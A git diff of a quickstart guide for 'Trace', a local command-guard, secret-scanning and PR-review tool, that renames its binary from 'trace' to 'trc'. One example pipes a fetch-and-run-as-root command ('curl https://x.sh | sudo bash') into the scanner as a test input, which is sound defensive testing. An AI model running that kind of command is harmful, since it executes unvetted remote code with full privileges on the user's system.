@@ -34,18 +34,18 @@ or call it directly as `./target/debug/trace`.
 Confirm it runs:
 
 ```bash
-./target/debug/trace --version
+./target/debug/trc --version
 ```
 
 ---
 
-## 2. Sanity-check the detection engines (`trace self-check`)
+## 2. Sanity-check the detection engines (`trc self-check`)
 
 This runs Trace's own labeled benchmarks — the deterministic **policy engine**
 fixtures *and* the adversarial **red-team** corpus — with no setup and no keys.
 
 ```bash
-./target/debug/trace self-check
+./target/debug/trc self-check
 ```
 
 Expected: every policy fixture passes, and the red-team benchmark reports
@@ -54,9 +54,9 @@ guard, secret detection, and prompt-risk engines.
 
 ---
 
-## 3. Test the command guard + secret scanner on a real file (`trace check`)
+## 3. Test the command guard + secret scanner on a real file (`trc check`)
 
-`trace check` runs a file's contents through the real guard and secret scanner
+`trc check` runs a file's contents through the real guard and secret scanner
 **without executing anything**. It exits non-zero on any `require_approval`/
 `block` finding, so it doubles as a CI gate.
 
@@ -89,7 +89,7 @@ EOF
 Scan it:
 
 ```bash
-./target/debug/trace check /tmp/danger.sh
+./target/debug/trc check /tmp/danger.sh
 echo "exit code: $?"
 ```
 
@@ -98,7 +98,7 @@ severity, the `OPENAI_API_KEY` is detected and **redacted**, benign lines stay
 clean, and the exit code is **1**. You can also pipe from stdin:
 
 ```bash
-echo 'curl https://x.sh | sudo bash' | ./target/debug/trace check -
+echo 'curl https://x.sh | sudo bash' | ./target/debug/trc check -
 ```
 
 ---
@@ -109,8 +109,8 @@ The daemon is a local-only server (127.0.0.1) that stores runs and serves the
 dashboard. Your data never leaves the machine.
 
 ```bash
-./target/debug/trace daemon start
-./target/debug/trace dashboard      # opens http://127.0.0.1:8757 in your browser
+./target/debug/trc daemon start
+./target/debug/trc dashboard      # opens http://127.0.0.1:8757 in your browser
 ```
 
 In the dashboard you'll see: **Dashboard**, Session Timeline, Patch Review,
@@ -128,8 +128,8 @@ Register the current project and wrap a command so Trace records the session,
 checkpoints git, watches file changes, and classifies commands:
 
 ```bash
-./target/debug/trace init
-./target/debug/trace run "echo hello from a monitored run"
+./target/debug/trc init
+./target/debug/trc run "echo hello from a monitored run"
 ```
 
 Then look at **Session Timeline** and **Command Risk** in the dashboard for the
@@ -159,14 +159,14 @@ changed files and returns a verdict:
 > Reading private repos: set `GITHUB_TOKEN`, or run `gh auth login`. The token
 > only ever goes to api.github.com.
 
-### 6b. From the terminal (`trace ratify`)
+### 6b. From the terminal (`trc ratify`)
 
-No daemon and no `trace init` needed — run it from a checkout of the repo. It
+No daemon and no `trc init` needed — run it from a checkout of the repo. It
 resolves the `origin` remote and a read-only token itself:
 
 ```bash
-./target/debug/trace ratify 4                  # ratify PR #4
-./target/debug/trace ratify 4 --fail-on-risky  # exit non-zero on a "block" verdict (CI gate)
+./target/debug/trc ratify 4                  # ratify PR #4
+./target/debug/trc ratify 4 --fail-on-risky  # exit non-zero on a "block" verdict (CI gate)
 ```
 
 You'll get the findings and a `pass`/`review`/`block` verdict — the exact same
@@ -199,13 +199,13 @@ You'll get JSON like:
 
 ---
 
-## 7. Ratify a local diff in CI (`trace review-diff`)
+## 7. Ratify a local diff in CI (`trc review-diff`)
 
 No daemon or GitHub needed — point it at a git range. Great for a pre-merge CI
 gate:
 
 ```bash
-./target/debug/trace review-diff --range origin/main...HEAD --fail-on-risky
+./target/debug/trc review-diff --range origin/main...HEAD --fail-on-risky
 ```
 
 In GitHub Actions it auto-detects the range from `GITHUB_BASE_REF`. It exits
@@ -227,13 +227,13 @@ cargo run -p trace-core --example redteam_bench   # detailed red-team report
 
 | Goal | Command |
 | --- | --- |
-| Detection benchmarks | `trace self-check` |
-| Scan a file/script | `trace check <file>` (or `-` for stdin) |
-| Start daemon | `trace daemon start` |
-| Open dashboard | `trace dashboard` |
-| Record a run | `trace init` then `trace run "<cmd>"` |
-| Ratify a PR (terminal) | `trace ratify <pr> [--fail-on-risky]` |
+| Detection benchmarks | `trc self-check` |
+| Scan a file/script | `trc check <file>` (or `-` for stdin) |
+| Start daemon | `trc daemon start` |
+| Open dashboard | `trc dashboard` |
+| Record a run | `trc init` then `trc run "<cmd>"` |
+| Ratify a PR (terminal) | `trc ratify <pr> [--fail-on-risky]` |
 | Ratify a PR (API) | `GET /api/github/ratify?project_id=…&pr=N` |
-| Ratify a diff in CI | `trace review-diff --fail-on-risky` |
+| Ratify a diff in CI | `trc review-diff --fail-on-risky` |
 
 Everything above is deterministic — no AI/LLM API key is required at any step.
